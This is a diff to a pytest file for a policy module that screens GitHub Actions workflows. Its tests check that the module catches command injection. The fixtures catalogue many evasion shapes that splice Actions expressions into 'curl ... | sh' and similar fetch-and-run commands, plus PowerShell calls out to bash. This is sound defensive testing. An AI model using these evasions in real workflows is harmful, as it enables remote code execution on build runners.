@@ -7135,7 +7170,7 @@ def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
 ) -> None:
     """A ``shell:`` value naming a second interpreter cannot be trusted."""
     target = tmp_path / "workflow.yml"
-    target.write_text(_SPOOFED_SHELL_WORKFLOW, encoding="utf-8")
+    _write_lf(target, _SPOOFED_SHELL_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _SPOOFED_SHELL_WORKFLOW, "curl http://example.test | sh")
 
@@ -7198,6 +7233,138 @@ def test_shells_merely_prefixed_by_an_interpreter_are_not_treated_as_non_bash(sh
     assert policy._is_non_bash_shell(shell) is False
 
 
+@pytest.mark.parametrize("shell", ["cmd /C", "cmd /S /C", "powershell.exe", "pwsh.exe -NoProfile"])
+def test_windows_shell_forms_outside_the_allowlist_are_not_non_bash(shell: str) -> None:
+    """`.exe` misses the runner extension table and `cmd` accepts a glued switch.
+
+    Both were tolerated before #3683 and both reach Bash, so both now block.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+def test_block_scalar_trailing_blank_lines_still_match_their_own_snippet() -> None:
+    """A `|+` body keeps trailing blank lines; the snippet arrives stripped.
+
+    Leaving the body unstripped inflated its line count, so the real step failed
+    to match its own snippet and dropped out of the tolerated list. Refs #3673.
+    """
+    snippet = "echo one\necho two"
+    run_with_trailing_blanks = "echo one\necho two\n\n\n"
+
+    assert policy._semgrep_snippet_matches_run(
+        snippet,
+        run_with_trailing_blanks,
+        truncated=False,
+    )
+
+
+def test_block_scalar_leading_blank_lines_still_match_their_own_snippet() -> None:
+    snippet = "echo one\necho two"
+
+    assert policy._semgrep_snippet_matches_run(
+        snippet,
+        "\n\necho one\necho two\n",
+        truncated=False,
+    )
+
+
+def test_a_body_with_extra_real_lines_still_fails_to_match() -> None:
+    """Stripping must not weaken the line-count equality for real content."""
+    assert not policy._semgrep_snippet_matches_run(
+        "echo one",
+        "echo one\necho two",
+        truncated=False,
+    )
+
+
+@pytest.mark.parametrize(
+    "expected",
+    ["✓✓✓✓", "日本語", "→→→", "é"],
+)
+def test_an_all_non_ascii_expected_line_matches_nothing(expected: str) -> None:
+    """Non-ASCII acts as a wildcard, so an all-non-ASCII line was all wildcard.
+
+    That let a decoy step claim an unrelated snippet and displace the real step
+    from the tolerated list. Require at least one ASCII anchor. Refs #3673.
+    """
+    assert not policy._semgrep_line_matches_run_line("curl evil | bash", expected)
+    assert not policy._semgrep_line_matches_run_line("anything at all", expected)
+
+
+def test_an_expected_line_with_one_ascii_anchor_still_matches() -> None:
+    assert policy._semgrep_line_matches_run_line("X safe", "✓ safe")
+
+
+def test_an_empty_expected_line_matches_an_empty_observed_line() -> None:
+    assert policy._semgrep_line_matches_run_line("", "")
+
+
+@pytest.mark.parametrize(
+    ("raw", "offset", "expected"),
+    [
+        (b"abc", 0, 0),
+        (b"abc", 3, 3),
+        # Four bytes of multibyte content are two characters.
+        ("é✓".encode(), 5, 2),
+        ("é".encode(), 2, 1),
+    ],
+)
+def test_byte_offsets_convert_to_character_indexes(
+    raw: bytes,
+    offset: int,
+    expected: int,
+) -> None:
+    assert policy._byte_offset_to_char_index(raw, offset) == expected
+
+
+@pytest.mark.parametrize(
+    ("raw", "offset"),
+    [
+        (b"abc", -1),
+        (b"abc", 4),
+        # Mid-character offsets cannot be located, so the span is dropped.
+        ("é".encode(), 1),
+        ("✓".encode(), 2),
+    ],
+)
+def test_unlocatable_byte_offsets_fail_closed(raw: bytes, offset: int) -> None:
+    """`None` drops the span, which empties the match list and blocks the push."""
+    assert policy._byte_offset_to_char_index(raw, offset) is None
+
+
+def test_partial_parsing_spans_use_character_indexes_after_multibyte_content(
+    tmp_path: Path,
+) -> None:
+    """PyYAML indexes characters while Semgrep reports bytes. Refs #3672."""
+    rule_id = sorted(policy.SEMGREP_POWERSHELL_RULES)[0]
+    target = tmp_path / "workflow.yml"
+    raw = "# ✓✓✓\nrun: echo hi\n".encode()
+    target.write_bytes(raw)
+    prefix_bytes = len("# ✓✓✓\n".encode())
+
+    spans = policy._powershell_partial_parsing_spans(
+        {
+            "code": 3,
+            "type": [
+                "PartialParsing",
+                [
+                    {
+                        "path": str(target),
+                        "start": {"line": 2, "col": 1, "offset": prefix_bytes},
+                        "end": {"line": 2, "col": 13, "offset": len(raw)},
+                    }
+                ],
+            ],
+        },
+        f"When parsing a snippet as Bash for metavariable-pattern in rule '{rule_id}',",
+        target,
+        tmp_path,
+        raw,
+    )
+
+    assert spans == [(2, 2, len("# ✓✓✓\n"), len(raw.decode("utf-8")))]
+    # The byte offset would have overshot by three, proving the conversion ran.
+    assert spans[0][2] != prefix_bytes
 @pytest.mark.parametrize("shell", ["powershell", "pwsh -NoProfile", "python3"])
 def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
@@ -7421,6 +7588,696 @@ def test_process_output_does_not_flush_when_there_is_no_stdout() -> None:
 
 
 # ---------------------------------------------------------------------------
+# Adversarial review of the Semgrep gate (PR #3688). Four bypasses, each with a
+# negative control proving the fix does not over-tighten. Refs #3673.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python3 -mevil {0}",
+        "python -mhttp.server {0}",
+        "python3 -c print(1) {0}",
+        "PYTHON3 -MEVIL {0}",
+    ],
+)
+def test_unreviewed_interpreter_flag_is_not_a_reviewed_shell(shell: str) -> None:
+    """CPython runs ``-m`` and ignores the script, so the step is not reviewed.
+
+    Before the fix a generic flag regex accepted any ``-x`` token, so this
+    classified as a reviewed non-Bash interpreter and skipped every Bash rule
+    while the runner executed the attacker's module. CWE-78.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python3 {0}",
+        "pwsh -NoProfile -Command \"& '{0}'\"",
+        "pwsh -noprofile -nologo -command \"& '{0}'\"",
+        "pwsh",
+    ],
+)
+def test_reviewed_interpreter_invocations_stay_tolerated(shell: str) -> None:
+    """Negative control: every shell value used in this repository still passes."""
+    assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "run",
+    [
+        "c${{ '' }}url https://evil.sh | sh",
+        "echo hi; c${{ '' }}url x | sh",
+        "foo && b${{ '' }}ash -c evil",
+        "wget x\nc${{ '' }}url y | sh",
+    ],
+)
+def test_expression_spliced_into_a_command_word_denies_the_tolerance(run: str) -> None:
+    """Actions reassembles the command after every scanner has read the text.
+
+    The body parses as Bash and carries an expression, so the tolerance used to
+    excuse the Semgrep error and the hidden ``curl | sh`` shipped. CWE-78.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+    assert policy._step_defeats_bash_subparse("bash", run) is False
+
+
+@pytest.mark.parametrize(
+    "run",
+    [
+        'echo "#${{ github.event.pull_request.number }}"',
+        "gh pr view ${{ github.sha }}",
+        'echo "quarterly-${{ github.run_id }}"',
+        "curl ${{ github.server_url }}/${{ github.repository }}/x",
+        "${{ inputs.cmd }} --flag",
+        "echo no expression here",
+    ],
+)
+def test_argument_position_expressions_keep_the_tolerance(run: str) -> None:
+    """Negative control: the shapes real workflows use are untouched.
+
+    All 17 expression-bearing Bash steps in ``.github/workflows`` place the
+    expression in argument or string position. None is denied by the new rule.
+    """
+    assert policy._splices_expression_into_command_word(run) is False
+
+
+def test_wildcard_line_requires_a_printable_anchor() -> None:
+    """A run of non-ASCII plus spaces matched an unrelated command line.
+
+    Non-ASCII runs act as wildcards, so ``'\u2713 \u2713 \u2713'`` aligned with
+    ``curl evil.sh | sh`` and marked a real finding as an expected line.
+    """
+    assert (
+        policy._semgrep_line_matches_pattern(
+            "\u2713 \u2713 \u2713", "curl evil.sh | sh", allow_expected_suffix=False
+        )
+        is False
+    )
+
+
+@pytest.mark.parametrize(
+    ("expected", "actual"),
+    [
+        ("", ""),
+        ("echo hi", "echo hi"),
+        ("  echo hi", "  echo hi"),
+        ("echo \u2713 done", "echo \u2713 done"),
+    ],
+)
+def test_anchor_guard_leaves_ordinary_lines_matching(expected: str, actual: str) -> None:
+    """Negative control: blank interior lines of a ``run:`` block still match.
+
+    ``_semgrep_snippet_matches_run`` splits the body on newlines, so an empty
+    expected line is normal. Requiring an anchor unconditionally would have
+    dropped every step containing a blank line.
+    """
+    assert (
+        policy._semgrep_line_matches_pattern(expected, actual, allow_expected_suffix=False)
+        is True
+    )
+
+
+def test_char_index_map_matches_the_per_offset_converter() -> None:
+    """The single-pass map is exactly equivalent, including the rejections."""
+    raw = "a\u00e9b\u20acc\U0001f600d\ne\u00e9\n".encode()
+    mapping = policy._utf8_char_index_map(raw)
+    assert mapping is not None
+    for offset in range(-2, len(raw) + 3):
+        assert mapping.get(offset) == policy._byte_offset_to_char_index(raw, offset)
+
+
+def test_char_index_map_declines_a_file_that_is_not_utf8() -> None:
+    """A file that fails to decode falls back to the per-offset path.
+
+    Returning a partial map would turn an offset inside the decodable prefix
+    into ``None``, which drops the span and blocks the push.
+    """
+    raw = b"abc\xff\xfedef"
+    assert policy._utf8_char_index_map(raw) is None
+    assert policy._byte_offset_to_char_index(raw, 3) == 3
+
+
+# Adversarial review round 2: sixteen ways an expression reaches command
+# position without crossing a separator character. Refs #3673.
+_COMMAND_POSITION_EVASIONS = (
+    pytest.param('"c${{ github.event.number }}url" http://x | sh', id="double-quoted-word"),
+    pytest.param("'c'${{ github.event.number }}'url' http://x | sh", id="single-quote-glue"),
+    pytest.param("c\\\n${{ github.event.number }}url http://x | sh", id="line-continuation"),
+    pytest.param("c\\ ${{ github.event.number }}url http://x", id="escaped-space"),
+    pytest.param("$(echo c)${{ github.event.number }}url http://x", id="command-substitution"),
+    pytest.param("`echo c`${{ github.event.number }}url http://x", id="backtick-substitution"),
+    pytest.param("${PREFIX}${{ github.event.number }}url http://x", id="parameter-expansion"),
+    pytest.param("if true; then c${{ github.event.number }}url http://x; fi", id="after-then"),
+    pytest.param("for i in 1; do c${{ github.event.number }}url http://x; done", id="after-do"),
+    pytest.param(
+        "if false; then :; else c${{ github.event.number }}url http://x; fi",
+        id="after-else",
+    ),
+    pytest.param("! c${{ github.event.number }}url http://x", id="after-bang"),
+    pytest.param("c${{ github.event.number }}url http://x >/dev/null", id="before-redirect"),
+    pytest.param("cat </dev/null; c${{ github.event.number }}url http://x", id="after-redirect"),
+    pytest.param("FOO=bar c${{ github.event.number }}url http://x", id="assignment-prefix"),
+    pytest.param("eval c${{ github.event.number }}url http://x", id="eval-argument"),
+    pytest.param(
+        "printf 'c${{ github.event.number }}url http://x' | xargs -0 bash -c",
+        id="piped-into-shell",
+    ),
+)
+
+
+@pytest.mark.parametrize("run", _COMMAND_POSITION_EVASIONS)
+def test_expression_splices_are_detected_in_every_command_position(run: str) -> None:
+    """Every adversarial shape that reaches a command word is refused tolerance.
+
+    Each case glues an expression onto ``c...url`` so Actions rebuilds ``curl``
+    after Semgrep has already read the file. Tolerating the resulting parse
+    error would wave the step through.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+
+
+def test_separator_scan_negative_control_is_defeated_by_most_of_the_corpus() -> None:
+    """Prove the old separator scan misses the majority of these evasions."""
+    old_separator = re.compile(r"[\n;&|(]")
+    old_partial = re.compile(r"[\w./-]+")
+
+    def old_check(run: str) -> bool:
+        for match in policy.ACTIONS_EXPRESSION_RE.finditer(run):
+            segment = old_separator.split(run[: match.start()])[-1].lstrip()
+            if segment and old_partial.fullmatch(segment):
+                return True
+        return False
+
+    missed = [
+        text
+        for case in _COMMAND_POSITION_EVASIONS
+        if not old_check(text := cast(str, case.values[0]))
+    ]
+    assert len(missed) > len(_COMMAND_POSITION_EVASIONS) // 2
+
+
+_ARGUMENT_POSITION_SHAPES = (
+    pytest.param('echo "${{ github.event.number }}"', id="quoted-argument"),
+    pytest.param("gh pr view ${{ github.event.number }} --json title", id="bare-argument"),
+    pytest.param('if [ "${{ inputs.mode }}" = "x" ]; then echo hi; fi', id="test-condition"),
+    pytest.param('curl http://x | sh # ${{ inputs.mode }}', id="trailing-comment"),
+    pytest.param('printf "%s" "${{ inputs.mode }}" > out.txt', id="redirect-argument"),
+    pytest.param("MODE=${{ inputs.mode }} ./run.sh", id="assignment-value"),
+    pytest.param("${{ inputs.cmd }} --flag", id="lone-expression"),
+    pytest.param('echo "a ${{ inputs.mode }} b" | tee log', id="inside-string-piped"),
+    pytest.param('cat <<EOF\n${{ inputs.mode }}\nEOF', id="heredoc-body"),
+    pytest.param("./run.sh --mode=${{ inputs.mode }}", id="flag-value"),
+)
+
+
+@pytest.mark.parametrize("run", _ARGUMENT_POSITION_SHAPES)
+def test_argument_position_expressions_are_not_treated_as_splices(run: str) -> None:
+    """Real workflow shapes keep their tolerance.
+
+    Narrowing the check until it caught the evasions is only safe if it leaves
+    ordinary usage alone; every shape here appears in real workflows, and a
+    lone expression is raw interpolation that its own validation covers.
+    """
+    assert policy._splices_expression_into_command_word(run) is False
+
+
+def test_shell_sink_promotion_stays_inside_its_own_pipeline() -> None:
+    """A sink elsewhere in the body does not promote an unrelated expression.
+
+    ``curl ... | sh`` guarded by an expression condition is the exact shape the
+    tolerance exists for. Promoting every word in the body once any sink
+    appeared anywhere would refuse it.
+    """
+    run = 'if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n  curl http://x | sh\nfi'
+    assert policy._splices_expression_into_command_word(run) is False
+
+
+# Adversarial review round 3 against the tokenizer that replaced the separator
+# scan. Sixty-five shapes were probed; these are the twenty-three that defeated
+# the first tokenizer. Refs #3673.
+_TOKENIZER_EVASIONS = (
+    pytest.param("bash <<< \"c${{ inputs.x }}url http://y | sh\"", id="here-string"),
+    pytest.param("coproc c${{ inputs.x }}url http://y", id="coproc"),
+    pytest.param("builtin c${{ inputs.x }}url http://y", id="builtin-prefix"),
+    pytest.param("sudo c${{ inputs.x }}url http://y", id="sudo-prefix"),
+    pytest.param("setsid c${{ inputs.x }}url http://y", id="setsid-prefix"),
+    pytest.param("stdbuf -o0 c${{ inputs.x }}url http://y", id="stdbuf-prefix"),
+    pytest.param("case x in\n  x) c${{ inputs.x }}url http://y ;;\nesac", id="case-pattern"),
+    pytest.param(
+        "case x in\n  x) : ;& y) c${{ inputs.x }}url http://y ;;\nesac",
+        id="case-fallthrough",
+    ),
+    pytest.param(
+        "case x in\n  x) : ;;& y) c${{ inputs.x }}url http://y ;;\nesac",
+        id="case-resume",
+    ),
+    pytest.param("echo hi > >(c${{ inputs.x }}url http://y)", id="process-substitution-out"),
+    pytest.param("source /dev/stdin <<< \"c${{ inputs.x }}url http://y\"", id="source-sink"),
+    pytest.param(". /dev/stdin <<< \"c${{ inputs.x }}url http://y\"", id="dot-source-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | python3 -c 'pass'", id="python-inline-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | perl -e 'system(<>)'", id="perl-inline-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | node -e 'x'", id="node-inline-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | awk '{system($0)}'", id="awk-sink"),
+    pytest.param("ssh host \"c${{ inputs.x }}url http://y\"", id="ssh-sink"),
+    pytest.param("find . -exec c${{ inputs.x }}url http://y \\;", id="find-exec-sink"),
+    pytest.param("script -qc \"c${{ inputs.x }}url http://y\" /dev/null", id="script-sink"),
+    pytest.param("echo 'c${{ inputs.x }}url' | ruby -e 'x'", id="ruby-inline-sink"),
+    pytest.param(
+        "echo 'c${{ inputs.x }}url http://y' | while read l; do eval \"$l\"; done",
+        id="piped-into-compound-eval",
+    ),
+    pytest.param("CMD=c${{ inputs.x }}url; $CMD http://y", id="assignment-then-expansion"),
+    pytest.param("bash <(echo c${{ inputs.x }}url http://y)", id="process-substitution-in"),
+)
+
+
+@pytest.mark.parametrize("run", _TOKENIZER_EVASIONS)
+def test_tokenizer_evasions_are_refused_tolerance(run: str) -> None:
+    """Round-three shapes that reached command position are all refused.
+
+    Each defeated the first tokenizer: a missing sink, a compound command that
+    broke the pipeline, a here-string or process substitution swallowed as a
+    redirect target, or an expression followed through an assignment.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+
+
+def test_unbalanced_quote_splice_is_blocked_by_the_syntax_check() -> None:
+    """The one shape the tokenizer misses is caught downstream.
+
+    An unterminated quote swallows the spliced word into an argument, so the
+    tokenizer allows it. The body is not valid shell, so the syntax check
+    refuses the tolerance before the allowance can matter. Recorded here so a
+    later change to either half cannot silently open the hole.
+    """
+    run = 'echo "unterminated\nc${{ inputs.x }}url http://y'
+    assert policy._splices_expression_into_command_word(run) is False
+    assert policy._body_is_valid_shell_syntax(run) is False
+    assert policy._step_defeats_bash_subparse("bash", run) is False
+
+
+def test_script_interpreters_are_sinks_only_with_an_inline_code_flag() -> None:
+    """Running a script file does not promote its arguments to command position.
+
+    Adding ``python3`` to the sink set without this test refused
+    ``python3 build.py --tag "v${{ inputs.version }}"``, a shape that appears in
+    real workflows.
+    """
+    assert policy._splices_expression_into_command_word(
+        'python3 build.py --tag "v${{ inputs.version }}"'
+    ) is False
+    assert policy._splices_expression_into_command_word(
+        "echo 'c${{ inputs.x }}url' | python3 -c 'pass'"
+    ) is True
+
+
+def test_tainted_variable_must_be_the_whole_command_word() -> None:
+    """A tainted name inside a larger command word is an argument, not a command.
+
+    Following assignments without this rule refused agent-metrics.yml, where
+    ``COVERAGE="${{ ... }}"`` is later read inside ``$(echo "$COVERAGE >= 50" |
+    bc -l)``.
+    """
+    assert policy._splices_expression_into_command_word(
+        'COVERAGE="${{ steps.check.outputs.coverage }}"\n'
+        'if (( $(echo "$COVERAGE >= 50" | bc -l) )); then echo ok; fi'
+    ) is False
+
+
+_STAGED_SINK_EVASIONS = (
+    # A variable holding the shell name reaches the sink lookup only if
+    # assignments are followed for sink names, not just for tainted values.
+    'SH=bash; $SH -c "c${{ github.event.pull_request.title }}url http://x"',
+    # A brace group is a compound command, so the pipe that follows it has to
+    # fold the group back into its own pipeline.
+    "echo 'c${{ github.event.pull_request.title }}url http://x' | { eval \"$l\"; }",
+    "{ echo 'c${{ github.event.pull_request.title }}url http://x'; } | sh",
+    # A subshell feeding a pipe is the same shape with different brackets.
+    "(echo 'c${{ github.event.pull_request.title }}url http://x') | sh",
+    # An interpreter flag glued to its script still runs the script.
+    "echo 'c${{ github.event.pull_request.title }}url' | perl -e'system(<>)'",
+    # A line continuation inside the command name hides it from a plain lookup.
+    'ba\\\nsh -c "c${{ github.event.pull_request.title }}url http://x"',
+    # Staging the payload in a file moves it between pipelines without a pipe.
+    "echo 'c${{ github.event.pull_request.title }}url http://x' > /tmp/f & sh /tmp/f",
+)
+
+
+@pytest.mark.parametrize("run", _STAGED_SINK_EVASIONS)
+def test_staged_sink_evasions_are_refused_tolerance(run: str) -> None:
+    """Round-four shapes that reached a sink indirectly are all refused.
+
+    Each defeated the pipeline-scoped tokenizer by putting distance between the
+    spliced word and the sink: a variable holding the shell name, a group piped
+    onwards, a glued interpreter flag, a line continuation inside the command
+    name, or a file staged in one pipeline and executed in another.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+
+
+_STAGED_SINK_NEGATIVE_CONTROL = (
+    # A brace expansion is not a compound command.
+    'mkdir -p "out/${{ inputs.name }}"/{a,b}',
+    # A group whose output is not piped keeps its own pipeline, so a sink
+    # inside it must not promote an expression outside it.
+    'if [ "${{ inputs.flag }}" = "true" ]; then curl -sSL http://x | sh; fi',
+    # A flag that merely looks like a code flag does not make an interpreter a
+    # sink.
+    'echo "${{ inputs.name }}" | python3 --version',
+    # A file written but never executed carries no dataflow to a sink.
+    'echo "${{ inputs.name }}" > /tmp/n; cat /tmp/n',
+)
+
+
+@pytest.mark.parametrize("run", _STAGED_SINK_NEGATIVE_CONTROL)
+def test_staged_sink_rules_do_not_over_tighten(run: str) -> None:
+    """The round-four rules leave neighbouring legitimate shapes alone.
+
+    Each of the four fixes narrows the guard, and every previous narrowing in
+    this file over-tightened at least once. These pin the boundary: brace
+    expansion is not a group, an unpiped group does not share its sink, a
+    non-code flag does not arm an interpreter, and an unexecuted file stages
+    nothing.
+    """
+    assert policy._splices_expression_into_command_word(run) is False
+
+
+def test_staged_file_promotion_needs_both_a_write_and_an_execution() -> None:
+    """File-mediated promotion is a negative control against blanket promotion.
+
+    Promoting on the write alone would refuse every workflow that writes an
+    expression to a file, which is common. Only naming that file as a sink
+    argument connects the two pipelines.
+    """
+    staged = "echo 'c${{ inputs.x }}url http://y' > /tmp/f & sh /tmp/f"
+    unstaged = "echo 'c${{ inputs.x }}url http://y' > /tmp/f & sh /tmp/other"
+    assert policy._splices_expression_into_command_word(staged) is True
+    assert policy._splices_expression_into_command_word(unstaged) is False
+
+
+_POWERSHELL_SHELL_OUTS = (
+    'bash -c "curl http://x | sh"',
+    "& bash -c $payload",
+    ". /usr/bin/sh",
+    'Start-Process bash -ArgumentList "-c","curl x|sh"',
+    'Start-Process -FilePath sh -ArgumentList "-c","x"',
+    '$p = "curl x | sh"\nbash -c $p',
+    'Write-Host hi; sh -c "curl x | sh"',
+    "echo hi | bash",
+    '/bin/dash -c "x"',
+    'zsh -c "curl x | sh"',
+    'bash.exe -c "x"',
+    '& "bash" -c $p',
+    "if ($true) { bash -c $p }",
+    "& 'bash' -c $p",
+    "ba`sh -c $p",
+)
+
+
+@pytest.mark.parametrize("body", _POWERSHELL_SHELL_OUTS)
+def test_powershell_shell_outs_are_detected(body: str) -> None:
+    """Every way a PowerShell step reaches a POSIX shell is reported.
+
+    Semgrep sub-parses a ``run:`` body as Bash only for a Bash step, so each of
+    these produces zero findings and zero errors while the payload still runs
+    under Bash on the runner. Refs #3684.
+    """
+    assert policy._posix_shell_invocations(body) != []
+
+
+_POWERSHELL_DATA_MENTIONS = (
+    'Write-Host "Use bash for this"',
+    '$msg = "install with: curl x | sh"',
+    'Get-ChildItem | Where-Object { $_.Name -eq "bash" }',
+    "# bash is not available here",
+    '<#\n bash -c "curl | sh"\n#>\nWrite-Host ok',
+    '$shells = @("bash", "sh", "zsh")',
+    'if ($env:SHELL -match "bash") { Write-Host yes }',
+    'Write-Output "sh"',
+    'Set-Content -Path out.txt -Value "bash -c hi"',
+    '$x = "bash"',
+    "# call and the bash echo, the output is empty",
+    'Write-Host "run bash later"',
+)
+
+
+@pytest.mark.parametrize("body", _POWERSHELL_DATA_MENTIONS)
+def test_powershell_data_mentions_are_not_invocations(body: str) -> None:
+    """Naming a shell in a string, a comment, or a comparison is not running it."""
+    assert policy._posix_shell_invocations(body) == []
+
+
+def test_naive_shell_name_regex_negative_control() -> None:
+    """Prove the quote-aware scan is what avoids the false positives.
+
+    A plain word-boundary search for a shell name flags real workflow prose. One
+    step in this repository says "the bash echo" in a comment, so the naive form
+    would block a push over an English sentence.
+    """
+    naive = re.compile(r"\b(?:bash|sh|dash|zsh|ksh)\b")
+    flagged = [body for body in _POWERSHELL_DATA_MENTIONS if naive.search(body)]
+    assert len(flagged) > len(_POWERSHELL_DATA_MENTIONS) // 2
+    assert all(policy._posix_shell_invocations(body) == [] for body in flagged)
+
+
+class TestQuotingAnArgumentDoesNotHideTheShellItNames:
+    """A quoted operand of an executing parameter is still the program that runs.
+
+    ``_powershell_words`` marks quoted text as data, which is correct for
+    command position: ``$x = "bash"`` names a shell without running one. It
+    then dropped that text from the word list entirely, so the word never
+    reached the check that reads the *preceding* token. ``-FilePath`` and
+    ``Start-Process`` execute their operand whether or not the author put
+    quotes around it, so dropping the quoted form let one keystroke defeat the
+    scan. Refs #3684.
+    """
+
+    def test_a_quoted_filepath_operand_is_reported(self) -> None:
+        body = 'Start-Process -FilePath "bash" -ArgumentList "-c","id"'
+        assert policy._posix_shell_invocations(body) == ["bash"]
+
+    def test_a_quoted_positional_operand_is_reported(self) -> None:
+        body = 'Start-Process "sh"'
+        assert policy._posix_shell_invocations(body) == ["sh"]
+
+    def test_quoting_does_not_change_the_verdict(self) -> None:
+        """The quoted and unquoted spellings of one command agree."""
+        quoted = 'Start-Process -FilePath "bash"'
+        bare = "Start-Process -FilePath bash"
+        assert policy._posix_shell_invocations(quoted) == policy._posix_shell_invocations(bare)
+
+    def test_a_quoted_word_outside_an_executing_parameter_stays_data(self) -> None:
+        """Emitting quoted words must not turn every string into an invocation.
+
+        This is the negative control for the widening: the same word, in the
+        same quotes, with a preceding token that does not execute it.
+        """
+        assert policy._posix_shell_invocations('Write-Output "sh"') == []
+        assert policy._posix_shell_invocations('$x = "bash"') == []
+        assert policy._posix_shell_invocations('Set-Content -Value "bash -c hi"') == []
+
+    def test_a_colon_joined_filepath_operand_is_reported(self) -> None:
+        """``-FilePath:bash`` binds the same operand as ``-FilePath bash``."""
+        body = "Start-Process -FilePath:bash -ArgumentList '-c','id'"
+        assert policy._posix_shell_invocations(body) == ["bash"]
+
+    def test_a_colon_joined_quoted_operand_is_reported(self) -> None:
+        body = 'Start-Process -FilePath:"bash" -ArgumentList "-c","id"'
+        assert policy._posix_shell_invocations(body) == ["bash"]
+
+    def test_a_colon_with_a_detached_operand_is_reported(self) -> None:
+        """``-FilePath: bash`` leaves the operand as the following word."""
+        body = "Start-Process -FilePath: bash"
+        assert policy._posix_shell_invocations(body) == ["bash"]
+
+    def test_a_colon_joined_non_shell_operand_stays_data(self) -> None:
+        """Negative control: the split must not widen past exec parameters."""
+        assert policy._posix_shell_invocations("Start-Process -FilePath:notepad") == []
+        assert policy._posix_shell_invocations('Write-Output "a:bash"') == []
+        assert policy._posix_shell_invocations("Get-Item C:\\bash") == []
+
+
+class TestACallTokenIsOnlyACallTokenUnderPowerShell:
+    """``&`` and ``.`` invoke a command in PowerShell and nowhere else.
+
+    ``_is_reviewed_shell_argument`` keys its flag allowlist per interpreter but
+    checked the call-token pattern globally, so ``python3 &'{0}'`` classified
+    as a reviewed non-Bash invocation. Under ``python3`` those characters are
+    an ordinary argument, not a call operator, so the exemption was granted on
+    a syntax the named interpreter does not have. Refs #3683.
+    """
+
+    @pytest.mark.parametrize("token", ["&'{0}'", ".'{0}'", '&"{0}"'])
+    def test_a_call_token_is_not_reviewed_under_a_non_powershell_interpreter(
+        self, token: str
+    ) -> None:
+        assert policy._is_reviewed_shell_argument(token, "python3") is False
+
+    @pytest.mark.parametrize("token", ["&'{0}'", ".'{0}'", '&"{0}"'])
+    @pytest.mark.parametrize("interpreter", ["pwsh", "powershell"])
+    def test_a_call_token_stays_reviewed_under_powershell(
+        self, interpreter: str, token: str
+    ) -> None:
+        """The narrowing must not withdraw the exemption PowerShell relies on."""
+        assert policy._is_reviewed_shell_argument(token, interpreter) is True
+
+    def test_the_placeholder_token_stays_reviewed_everywhere(self) -> None:
+        """``{0}`` is the runner's script path under every interpreter."""
+        assert policy._is_reviewed_shell_argument("{0}", "python3") is True
+        assert policy._is_reviewed_shell_argument("{0}", "pwsh") is True
+
+    @pytest.mark.parametrize(
+        "shell",
+        [
+            "pwsh -NoProfile -Command \"& '{0}'\"",
+            "pwsh",
+            "python3 {0}",
+        ],
+    )
+    def test_every_shell_string_used_in_this_repository_still_classifies(
+        self, shell: str
+    ) -> None:
+        """Pin the live workflow spellings so the narrowing cannot break them."""
+        assert policy._is_non_bash_shell(shell) is True
+
+def test_powershell_scan_reports_only_powershell_steps(tmp_path: Path) -> None:
+    workflow = tmp_path / ".github" / "workflows" / "w.yml"
+    workflow.parent.mkdir(parents=True)
+    _write_lf(workflow, "on: push\n"
+        "jobs:\n"
+        "  j:\n"
+        "    steps:\n"
+        "      - shell: bash\n"
+        '        run: bash -c "curl http://x | sh"\n'
+        "      - shell: pwsh\n"
+        '        run: Write-Host "bash is only mentioned"\n')
+    assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 0
+    _write_lf(workflow, "on: push\n"
+        "jobs:\n"
+        "  j:\n"
+        "    steps:\n"
+        "      - shell: pwsh\n"
+        '        run: bash -c "curl http://x | sh"\n')
+    assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 1
+
+
+def test_powershell_scan_skips_unreadable_and_non_yaml_paths(tmp_path: Path) -> None:
+    """A missing file or a non-YAML path is skipped rather than raising."""
+    assert policy._scan_powershell_shell_outs(tmp_path, ["scripts/a.py"]) == 0
+    assert policy._scan_powershell_shell_outs(tmp_path, ["absent.yml"]) == 0
+
+
+@pytest.mark.parametrize(
+    ("shell", "expected"),
+    [
+        ("pwsh", True),
+        ("powershell", True),
+        ("pwsh -NoProfile", True),
+        ("C:/tools/pwsh.exe -NoLogo", True),
+        ('"C:\\Program Files\\PowerShell\\pwsh.exe" -NoProfile', True),
+        ("bash -c 'pwsh'", False),
+        ("bash", False),
+        ("", False),
+        (None, False),
+    ],
+)
+def test_powershell_shell_declaration_is_recognised(shell: str | None, expected: bool) -> None:
+    """The shell key is matched by executable name, not by exact string."""
+    assert policy._is_powershell_shell(shell) is expected
+
+
+# Round-5 adversarial probe. Every shape below reached a shell through a route
+# the round-4 rules did not follow: an alias chain, a brace-form expansion, a
+# `|&` pipe, a file staged by an argument rather than a redirect, a staged file
+# run directly, a sink the set did not name, or the argument list. Refs #3683.
+_ROUND_FIVE_EVASIONS = (
+    ("alias-two-hop", 'A=bash; B=$A; $B -c "c{expression}url http://x"'),
+    ("alias-braced-use", 'SH=bash; ${{SH}} -c "c{expression}url http://x"'),
+    ("alias-cmdsub-rhs", 'SH=$(echo bash); $SH -c "c{expression}url http://x"'),
+    ("group-pipe-both", "(echo 'c{expression}url http://x') |& sh"),
+    ("staged-tee", "echo 'c{expression}url http://x' | tee /tmp/f; sh /tmp/f"),
+    ("staged-quoted-path", "echo 'c{expression}url http://x' > \"/tmp/f\"; sh \"/tmp/f\""),
